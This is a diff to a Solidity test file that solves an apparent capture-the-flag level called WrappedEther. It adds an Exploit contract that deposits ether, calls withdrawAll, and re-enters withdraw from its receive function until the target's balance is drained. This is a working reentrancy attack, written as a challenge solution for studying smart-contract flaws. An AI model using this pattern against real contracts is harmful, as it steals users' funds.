@@ -16,11 +16,11 @@ contract WrappedEtherTest is BaseTest {
     }
 
     function testExploitLevel() public {
-        /*
-        // cheating. again.
-        instance.approve(address(this), address(instance).balance);
-        instance.withdrawAll();
-        */
+        Exploit exploiter = new Exploit(instance);
+
+        vm.deal(address(exploiter), 0.1 ether);
+        vm.prank(address(exploiter));
+        exploiter.exploit(0.01 ether, 0.1 ether);
 
         checkSuccess();
     }
@@ -31,10 +31,25 @@ contract WrappedEtherTest is BaseTest {
             "Solution is not solving the level"
         );
     }
+}
 
-    fallback() external payable {
-        if (address(instance).balance > 0) {
-            instance.withdrawAll();
+contract Exploit {
+    WrappedEther public target;
+    uint256 public withdrawAmount;
+
+    constructor(WrappedEther _target) {
+        target = _target;
+    }
+
+    function exploit(uint256 _amount, uint256 _deposit) external {
+        withdrawAmount = _amount;
+        target.deposit{value: _deposit}(address(this));
+        target.withdrawAll();
+    }
+
+    receive() external payable {
+        if (address(target).balance >= withdrawAmount) {
+            target.withdraw(withdrawAmount);
         }
     }
 }
